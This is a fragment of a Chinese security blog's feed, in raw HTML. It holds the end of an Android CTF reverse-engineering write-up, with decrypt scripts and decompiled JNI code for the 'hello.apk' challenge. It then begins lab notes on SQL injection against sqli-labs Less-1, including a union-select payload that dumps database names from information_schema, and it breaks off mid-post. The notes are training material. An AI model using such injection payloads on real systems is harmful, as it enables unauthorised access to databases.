(v0&gt;&gt;<span class="number">5</span>) + k3))</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xffffffff</span></span><br><span class="line">    v[<span class="number">0</span>]=v0</span><br><span class="line">    v[<span class="number">1</span>]=v1</span><br><span class="line">    <span class="built_in">print</span>(v0, v1)</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">key =  [<span class="number">305419896</span>, <span class="number">2271560481</span>, <span class="number">2427178479</span>, <span class="number">4275878409</span>]</span><br><span class="line">arr = [[<span class="number">3888592564</span>, <span class="number">3737879155</span>], [<span class="number">4063334467</span>, <span class="number">2214487552</span>], [<span class="number">2420456096</span>, <span class="number">1529806583</span>], [<span class="number">2576007368</span>, <span class="number">2328179940</span>], [<span class="number">1665686107</span>, <span class="number">1748819876</span>]]</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;please input your secret key: &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line">encry = []</span><br><span class="line">encryted = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="number">8</span>):</span><br><span class="line">    encry.append(struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, flag[i:   i+<span class="number">4</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>))[<span class="number">0</span>])</span><br><span class="line">    encry.append(struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, flag[i+<span class="number">4</span>: i+<span class="number">8</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>))[<span class="number">0</span>])</span><br><span class="line">    encrypted = encrypt(encry, key)</span><br><span class="line">    encryted.append(encrypted)</span><br><span class="line">    encry = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(encryted != arr):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sry&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ok, fine&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>():</span></span><br><span class="line">    <span class="keyword">for</span> arri <span class="keyword">in</span> arr:</span><br><span class="line">        v0 = arri[<span class="number">0</span>]</span><br><span class="line">        v1 = arri[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            v1 = (v1 - ( ((v0&lt;&lt;<span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + xx[i]) ^ ( (v0&gt;&gt;<span class="number">5</span>) + k[<span class="number">3</span>]))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            v0 = (v0 - ( ((v1&lt;&lt;<span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + xx[i]) ^ ( (v1&gt;&gt;<span class="number">5</span>) + k[<span class="number">1</span>]))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            v1 = v1 &amp; <span class="number">0xffffffff</span></span><br><span class="line">            v0 = v0 &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="comment"># print(v0, v1)</span></span><br><span class="line">        <span class="built_in">print</span>(struct.pack(<span class="string">&quot;&lt;I&quot;</span>, v0).decode(<span class="string">&#x27;utf-8&#x27;</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(struct.pack(<span class="string">&quot;&lt;I&quot;</span>, v1).decode(<span class="string">&#x27;utf-8&#x27;</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">xx = []</span><br><span class="line">x_ = <span class="number">0</span></span><br><span class="line">delta = <span class="number">0x666666</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    x_ = (x_ + delta) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    xx.append(x_)</span><br><span class="line"></span><br><span class="line">k = key</span><br><span class="line">decrypt()</span><br></pre></td></tr></table></figure><h1 id="hello-apk"><a href="#hello-apk" class="headerlink" title="hello.apk"></a>hello.apk</h1><blockquote><p>“东华杯” 2021年大学生网络安全邀请赛暨第七届上海市大学生网络安全大赛</p></blockquote><p>本题为常见的<code>encode(flag, key)=cipher</code>的校验模式。<br>Java层可以得到信息：flag长度为42，key是程序的签名，校验函数是<code>StringFromJNI</code>，在native层。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg7)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(MainActivity.<span class="keyword">this</span>.input.getText().length() == <span class="number">42</span>) &#123;</span><br><span class="line">            Toast v7_2 = Toast.makeText(</span><br><span class="line">                MainActivity.<span class="keyword">this</span>, </span><br><span class="line">                                  MainActivity.<span class="keyword">this</span>.stringFromJNI(</span><br><span class="line">                                      MainActivity.<span class="keyword">this</span>.input.getText().toString(), </span><br><span class="line">                                      <span class="keyword">new</span> hi().getSignatures(arg7)),</span><br><span class="line">                  <span class="number">1</span>);</span><br><span class="line">            v7_2.setGravity(<span class="number">0</span>, <span class="number">0</span>, -<span class="number">700</span>);</span><br><span class="line">            v7_2.show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Toast v7_3 = Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;Hello!&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        v7_3.setGravity(<span class="number">0</span>, <span class="number">0</span>, -<span class="number">700</span>);</span><br><span class="line">        v7_3.show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(PackageManager.NameNotFoundException v7_1) &#123;  v7_1.printStackTrace();   &#125;</span><br><span class="line">    <span class="keyword">catch</span>(NoSuchAlgorithmException v7) &#123;      v7.printStackTrace();    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hi</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Log Log;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSignatures</span><span class="params">(View arg3)</span> <span class="keyword">throws</span> PackageManager.NameNotFoundException, NoSuchAlgorithmException </span>&#123;</span><br><span class="line">        MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        Signature[] signs = arg3.getContext().getPackageManager().getPackageInfo(<span class="string">&quot;com.example.hello&quot;</span>, <span class="number">0x40</span>).signatures;</span><br><span class="line">        <span class="keyword">if</span>(signs.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            Signature sign = signs[<span class="number">0</span>]; <span class="comment">// 一个程序可能拥有多个签名</span></span><br><span class="line">            Log.i(<span class="string">&quot;hello&quot;</span>, sign.toCharsString());</span><br><span class="line">            <span class="keyword">return</span> sign.toCharsString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;this_is_your_gift!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在native层，主要对flag进行了两次处理，最后与目标数组进行比较。<br>因为这里使用的是arm64，所以稍微有些陌生，需要阅读汇编代码。</p><p>先是对flag进行抑或加密，从下标1开始。抑或密钥来自签名sign，从sign的354下标开始，每次向后移动27。<br>然后对flag进行循环位移操作，这里使用了一些向量操作函数，但简单来说就是对flag的每个byte向右循环移动3位。<br>然后把flag与cipher进行比较，cipher的具体值可从ida中导出。<br>此外，sign的值可以通过安装运行从Log中获取。也可以使用JEB等工具导出<code>certificate</code>文件，二进制数据即为signatures。<br>虽然apk中<code>android:testOnly=true</code>，但是可以通过<code>adb -t install xxx.apk</code>安装。（感谢@Guohong的提示）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jstring __fastcall <span class="title">Java_com_example_hello_MainActivity_stringFromJNI</span><span class="params">(JNIEnv *env, __int64 thiz, __int64 input, __int64 sign)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int8x16_t</span> *inputs; <span class="comment">// x20</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *signs; <span class="comment">// x0</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *signs1; <span class="comment">// x21</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 ind; <span class="comment">// x23</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ind_p27; <span class="comment">// w24</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// w1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v12; <span class="comment">// w9</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v13; <span class="comment">// w11</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// w12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v15; <span class="comment">// w13</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v16; <span class="comment">// w14</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v17; <span class="comment">// w15</span></span><br><span class="line">  <span class="keyword">int8x16_t</span> v18; <span class="comment">// q0</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v19; <span class="comment">// w16</span></span><br><span class="line">  <span class="keyword">int8x16_t</span> v20; <span class="comment">// q1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v21; <span class="comment">// w17</span></span><br><span class="line">  __int64 ind2; <span class="comment">// x8</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *retStr1; <span class="comment">// x21</span></span><br><span class="line">  jstring v24; <span class="comment">// x19</span></span><br><span class="line">  <span class="keyword">char</span> retStr[<span class="number">16</span>]; <span class="comment">// [xsp+0h] [xbp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v27; <span class="comment">// [xsp+10h] [xbp-40h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [xsp+18h] [xbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v28 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>)) + <span class="number">40</span>);</span><br><span class="line">  inputs = (<span class="keyword">int8x16_t</span> *)(*env)-&gt;GetStringUTFChars(env, input, <span class="number">0LL</span>);</span><br><span class="line">  <span class="comment">// input本为42个byte的数组，在这里被保存为一个3x(16 byte)的对象，后续通过input[0],input[1],input[2]引用。</span></span><br><span class="line">  <span class="comment">// input[2]只有10个byte。</span></span><br><span class="line">  signs = (*env)-&gt;GetStringUTFChars(env, sign, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( inputs-&gt;n128_u8[<span class="number">0</span>] ) <span class="comment">// 汇编：LDRB W8, [X20]，即input[0],后续相同</span></span><br><span class="line">  &#123;</span><br><span class="line">    signs1 = signs;</span><br><span class="line">    inputs-&gt;n128_u8[<span class="number">0</span>] ^= signs[<span class="number">327</span>];</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)inputs) &gt;= <span class="number">2uLL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ind = <span class="number">1LL</span>;</span><br><span class="line">      ind_p27 = <span class="number">354</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123; <span class="comment">// input[ind] = input[ind] ^ (sign[ind_p27] + ind)</span></span><br><span class="line">        inputs-&gt;n128_u8[ind] ^= signs1[ind_p27] + (_BYTE)ind;<span class="comment">// sign的长度比较迷惑，通过Log获取</span></span><br><span class="line">        ++ind;</span><br><span class="line">        ind_p27 += <span class="number">27</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)inputs) &gt; ind );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// inputs的长度是int8x16 bit，即16char。输入42，刚好最后10单独处理</span></span><br><span class="line">  <span class="comment">// 简单来说，就是每个byte交换高3位和低5位的位置，或者说向右循环移动3位</span></span><br><span class="line">  v11 = (inputs[<span class="number">2</span>].n128_u8[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xFFFFE01F</span> | (<span class="number">32</span> * inputs[<span class="number">2</span>].n128_u8[<span class="number">0</span>]);</span><br><span class="line">  v12 = (inputs[<span class="number">2</span>].n128_u8[<span class="number">1</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x1F</span> | (<span class="number">32</span> * inputs[<span class="number">2</span>].n128_u8[<span class="number">1</span>]);</span><br><span class="line">  v13 = (inputs[<span class="number">2</span>].n128_u8[<span class="number">3</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xFFFFE01F</span> | (<span class="number">32</span> * inputs[<span class="number">2</span>].n128_u8[<span class="number">3</span>]);</span><br><span class="line">  v14 = (inputs[<span class="number">2</span>].n128_u8[<span class="number">4</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xFFFFE01F</span> | (<span class="number">32</span> * inputs[<span class="number">2</span>].n128_u8[<span class="number">4</span>]);</span><br><span class="line">  v15 = (inputs[<span class="number">2</span>].n128_u8[<span class="number">5</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xFFFFE01F</span> | (<span class="number">32</span> * inputs[<span class="number">2</span>].n128_u8[<span class="number">5</span>]);</span><br><span class="line">  v16 = (inputs[<span class="number">2</span>].n128_u8[<span class="number">6</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xFFFFE01F</span> | (<span class="number">32</span> * inputs[<span class="number">2</span>].n128_u8[<span class="number">6</span>]);</span><br><span class="line">  v17 = (inputs[<span class="number">2</span>].n128_u8[<span class="number">7</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xFFFFE01F</span> | (<span class="number">32</span> * inputs[<span class="number">2</span>].n128_u8[<span class="number">7</span>]);</span><br><span class="line">  v18 = vorrq_s8(vshrq_n_u8(*inputs, <span class="number">3uLL</span>), vshlq_n_s8(*inputs, <span class="number">5uLL</span>));</span><br><span class="line">  v19 = (inputs[<span class="number">2</span>].n128_u8[<span class="number">8</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xFFFFE01F</span> | (<span class="number">32</span> * inputs[<span class="number">2</span>].n128_u8[<span class="number">8</span>]);</span><br><span class="line">  v20 = vorrq_s8(vshrq_n_u8(inputs[<span class="number">1</span>], <span class="number">3uLL</span>), vshlq_n_s8(inputs[<span class="number">1</span>], <span class="number">5uLL</span>));</span><br><span class="line">  v21 = (inputs[<span class="number">2</span>].n128_u8[<span class="number">9</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xFFFFE01F</span> | (<span class="number">32</span> * inputs[<span class="number">2</span>].n128_u8[<span class="number">9</span>]);</span><br><span class="line">  inputs[<span class="number">2</span>].n128_u8[<span class="number">2</span>] = (inputs[<span class="number">2</span>].n128_u8[<span class="number">2</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x1F</span> | (<span class="number">32</span> * inputs[<span class="number">2</span>].n128_u8[<span class="number">2</span>]);</span><br><span class="line">  inputs[<span class="number">2</span>].n128_u8[<span class="number">0</span>] = v11;</span><br><span class="line">  inputs[<span class="number">2</span>].n128_u8[<span class="number">1</span>] = v12;</span><br><span class="line">  inputs[<span class="number">2</span>].n128_u8[<span class="number">3</span>] = v13;</span><br><span class="line">  inputs[<span class="number">2</span>].n128_u8[<span class="number">4</span>] = v14;</span><br><span class="line">  inputs[<span class="number">2</span>].n128_u8[<span class="number">5</span>] = v15;</span><br><span class="line">  inputs[<span class="number">2</span>].n128_u8[<span class="number">6</span>] = v16;</span><br><span class="line">  inputs[<span class="number">2</span>].n128_u8[<span class="number">7</span>] = v17;</span><br><span class="line">  inputs[<span class="number">2</span>].n128_u8[<span class="number">8</span>] = v19;</span><br><span class="line">  inputs[<span class="number">2</span>].n128_u8[<span class="number">9</span>] = v21;</span><br><span class="line">  *inputs = v18;</span><br><span class="line">  inputs[<span class="number">1</span>] = v20;</span><br><span class="line">  retStr[<span class="number">0</span>] = <span class="number">26</span>;</span><br><span class="line">  ind2 = <span class="number">0LL</span>;</span><br><span class="line">  v27 = <span class="number">0LL</span>;</span><br><span class="line">  retStr1 = &amp;retStr[<span class="number">1</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;retStr[<span class="number">1</span>], <span class="string">&quot;Wrong, wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( inputs-&gt;n128_u8[ind2] == cipher[ind2] )<span class="comment">//比较</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)++ind2 &gt; <span class="number">41</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::assign((<span class="keyword">int</span>)retStr, <span class="string">&quot;Hello, hello!&quot;</span>, <span class="number">0xD</span>u);</span><br><span class="line">      <span class="keyword">if</span> ( (retStr[<span class="number">0</span>] &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        retStr1 = v27;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v24 = (*env)-&gt;NewStringUTF(env, retStr1);</span><br><span class="line">  <span class="keyword">if</span> ( (retStr[<span class="number">0</span>] &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v27)</span></span>;</span><br><span class="line">  <span class="keyword">return</span> v24;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sign = <span class="string">&quot;308202e4308201cc020101300d06092a864886f70d010105050030373116301406035504030c0d416e64726f69642044656275673110300e060355040a0c07416e64726f6964310b30090603550406130255533020170d3231303330363134333034385a180f32303531303232373134333034385a30373116301406035504030c0d416e64726f69642044656275673110300e060355040a0c07416e64726f6964310b300906035504061302555330820122300d06092a864886f70d01010105000382010f003082010a0282010100cbf2b09e4308ebb459e8841e5a7b920497fef2b349e80648f7eb35f48d40a75e7ce7945b8b42d197bec0bf177e6c9899ed707dcc4a726cb14c1a69b0c4a02474806fa73cfb10e10f7b1665021c24762b6edad65ca63cea3c72e0d4e4ca3f98301173eec3254337af1f5a11f779ecbe04d1b74d53f5835e011222155a56f97e00d75374cd93080dfa087cd356a99fe1eebf5d6d5e31846aad5252c3a17a4656e2e210ce1c7aa4d147fb8cf440a50add61bbb2ec299a2e0dab0b4504796ac3a899da553ab1d83576691ab23409d18398014b3b5eaf12e83f4d99aa09e1e4e4cae133530730c1133da2b3dee37b58eb1a5795b221ec5a8830731a41167d295f9e1b0203010001300d06092a864886f70d010105050003820101000e4740235e9cf2be33de3e06d777139cbbc5cf0622285c17da04697b8067318aaf8df0fbb4d3166f293ea15aa2592f06eb6929af063722ac9f30ad85e2c087564931d6ac65fcd5fbc864b3dc9841e039c6e1d5fbc5c2f8adf90a547bc4ebc07d387914db24451c2cc89925359bd3bb0750c7aabf9d743b1893e98bbc8ff74b24fc0b4be2dbaaf1c917bba01496d0617ffc3a4a8b7a6e79a3036298a6ebf57bb00001e43a0b242864eebb0fcec9e323144d4447c878430f18e6e358ad97566fa04d1f07b171c1476c9af5a1eba0bf6616e219c0b9e1299d09fecded24a880397f92e0f99d8951228c7770c184fd77adff943bfc8b6aa524c5f0a6d7686fe35486&quot;</span></span><br><span class="line">cipher = [<span class="number">0xca</span>, <span class="number">0xeb</span>, <span class="number">0x4a</span>, <span class="number">0x8a</span>, <span class="number">0x68</span>, <span class="number">0xe1</span>, <span class="number">0xa1</span>, <span class="number">0xeb</span>, <span class="number">0xe1</span>, <span class="number">0xee</span>, <span class="number">0x6b</span>, <span class="number">0x84</span>, <span class="number">0xa2</span>, <span class="number">0x6d</span>, <span class="number">0x49</span>, <span class="number">0xc8</span>, <span class="number">0x8e</span>, <span class="number">0xe</span>, <span class="number">0xcc</span>, <span class="number">0xe9</span>, <span class="number">0x45</span>, <span class="number">0xcf</span>, <span class="number">0x23</span>, <span class="number">0xcc</span>, <span class="number">0xc5</span>, <span class="number">0x4c</span>, <span class="number">0xc</span>, <span class="number">0x85</span>, <span class="number">0xcf</span>, <span class="number">0xa9</span>, <span class="number">0x8c</span>, <span class="number">0xf6</span>, <span class="number">0xe6</span>, <span class="number">0xd6</span>, <span class="number">0x26</span>, <span class="number">0x6d</span>, <span class="number">0xac</span>, <span class="number">0xc</span>, <span class="number">0xac</span>, <span class="number">0x77</span>, <span class="number">0xe0</span>, <span class="number">0x64</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># shift byte</span></span><br><span class="line"><span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    x = ((cipher[ind] &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x7f</span>) | ((cipher[ind] &lt;&lt; <span class="number">3</span>) &amp; <span class="number">0x7f</span>)</span><br><span class="line">    cipher[ind] = x</span><br><span class="line"></span><br><span class="line">ind = <span class="number">354</span></span><br><span class="line"><span class="keyword">for</span> ind1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">42</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>( (cipher[ind1] ^ (<span class="built_in">ord</span>(sign[ind]) + ind1 )) &amp; <span class="number">0x7f</span> ), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    ind = ind + <span class="number">27</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录最近做的一些Android逆向题目。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://slient2009.github.io/tags/CTF/"/>
    
    <category term="Android" scheme="http://slient2009.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>SQL,XSS,文件上传实验记录</title>
    <link href="http://slient2009.github.io/2021/11/22/Web-Labs/"/>
    <id>http://slient2009.github.io/2021/11/22/Web-Labs/</id>
    <published>2021-11-22T05:00:00.000Z</published>
    <updated>2021-12-10T17:44:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>很久之前的实训课程实验记录，权当凑数。</p><span id="more"></span><h2 id="SQL-Lab"><a href="#SQL-Lab" class="headerlink" title="SQL-Lab"></a>SQL-Lab</h2><h3 id="数据库结构"><a href="#数据库结构" class="headerlink" title="数据库结构"></a>数据库结构</h3><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126185241263.png" alt="image-20201126185241263"></p><p><strong>information_schema</strong></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126185203312.png" alt="image-20201126185203312"></p><p><strong>security</strong></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126185303420.png" alt="image-20201126185303420"></p><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><h4 id="检查是否存在注入点"><a href="#检查是否存在注入点" class="headerlink" title="检查是否存在注入点"></a>检查是否存在注入点</h4><p>一般直接加引号<code>&#39;</code>，也可以考虑宽字符闭合引号。<br>这里一试就报错发现有注入点。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714221315153.png" alt="image-20200714221315153"></p><h4 id="检查关键字过滤"><a href="#检查关键字过滤" class="headerlink" title="检查关键字过滤"></a>检查关键字过滤</h4><p>一般来说会过滤一些关键字，诸如select、union、where等。<br>如果有过滤就要使用一些绕过手段，比如双写绕过、注释绕过等，本次课程还未涉及所以不讨论。<br>事实上还有关于注释符的过滤，绕过方法也有很多。（如果过滤规则不是很严的话）</p><h4 id="判断回显"><a href="#判断回显" class="headerlink" title="判断回显"></a>判断回显</h4><p>确定sql查询语句有多少回显位，一般使用order by 语句二分确定回显位。<br>这里可以确定有4个回显位。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714221822503.png" alt="image-20200714221822503"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714221834365.png" alt="image-20200714221834365"></p><h4 id="查出相关参数"><a href="#查出相关参数" class="headerlink" title="查出相关参数"></a>查出相关参数</h4><p>一般不急着查information_schema那几张表，先看看database() user()之类的函数结果。<br>这里先看到数据库名和用户名。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714222222788.png" alt="image-20200714222222788"></p><h4 id="查information-schema"><a href="#查information-schema" class="headerlink" title="查information_schema"></a>查information_schema</h4><p>先要明确information_schema里面有什么内容</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714222415460.png" alt="image-20200714222415460"></p><h4 id="根据得到的数据库名查表和列"><a href="#根据得到的数据库名查表和列" class="headerlink" title="根据得到的数据库名查表和列"></a>根据得到的数据库名查表和列</h4><p><code>id=-1&#39; union select 1,group_concat(schema_name),2 from information_schema.schemata where &#39;1&#39;=&#39;1</code><br>直接出所有数据库名<br><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714223437960.png" alt="image-20200714223437960"></p><h4 id="拿到security下的所有表"><a href="#拿到security下的所有表" class="headerlink" title="拿到security下的所有表"></a>拿到security下的所有表</h4><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714223722924.png" alt="image-20200714223722924"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714223712801.png" alt="image-20200714223712801"></p><h4 id="继续查表"><a href="#继续查表" class="headerlink" title="继续查表"></a>继续查表</h4><p>大概对users表感兴趣，那就看看users下面都有哪些字段，然后顺手读出来。<br><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714224157880.png" alt="image-20200714224157880"></p><p><img 